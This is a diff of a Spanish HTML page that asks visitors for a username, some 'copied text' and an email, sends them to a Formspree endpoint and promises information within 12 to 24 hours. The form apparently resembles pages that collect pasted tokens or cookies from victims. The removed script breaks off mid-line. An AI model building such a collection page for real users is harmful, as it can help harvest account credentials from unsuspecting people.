@@ -1,88 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Información del usuario</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f2f4f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #fff;
-            padding: 30px;
-            max-width: 500px;
-            width: 90%;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        h1 {
-            margin-bottom: 20px;
-            color: #333;
-        }
-        input, textarea {
-            width: 90%;
-            padding: 10px;
-            margin: 8px 0;
-            border-radius: 6px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-        }
-        button {
-            padding: 12px 25px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #mensaje {
-            display: none;
-            color: green;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Información del usuario</title>
 </head>
 <body>
-<div class="container">
-    <h1>Información del usuario</h1>
-    <!-- Link de Formspree ya actualizado -->
-    <form id="formulario" action="https://formspree.io/f/mgovovrb" method="POST">
-        <input type="text" name="usuario" placeholder="Usuario" required><br>
-        <textarea name="texto" placeholder="Texto copiado" rows="4" required></textarea><br>
-        <input type="email" name="correo" placeholder="Correo" required><br>
-        <button type="submit">Enviar</button>
-    </form>
-    <div id="mensaje">
-        ¡Formulario enviado! Por favor, espera de 12 a 24 horas para que te mandemos la información a tu correo.
-    </div>
-</div>
 
-<script>
-const form = document.getElementById('formulario');
+<h1>Información del usuario</h1>
 
-form.addEventListener('submit', function(event) {
-    event.preventDefault();
-    const data = new FormData(form);
-    
-    fetch(form.action, {
-        method: 'POST',
-        body: data,
-        headers: {
-            'Accept': 'application/json'
-        }
-    }).then(response => {
-        if (response.ok) {
-            form.style.display = 'none';
-            document.getElementById('m
+<form action="https://formspree.io/f/mgovovrb" method="POST">
+  <input type="text" name="usuario" placeholder="Usuario" required><br><br>
+  <textarea name="texto" placeholder="Texto copiado" required></textarea><br><br>
+  <input type="email" name="correo" placeholder="Correo" required><br><br>
+  <button type="submit">Enviar</button>
+</form>
+
+<p>Por favor, espera de 12 a 24 horas para que te enviemos la información a tu correo.</p>
+
+</body>
+</html>
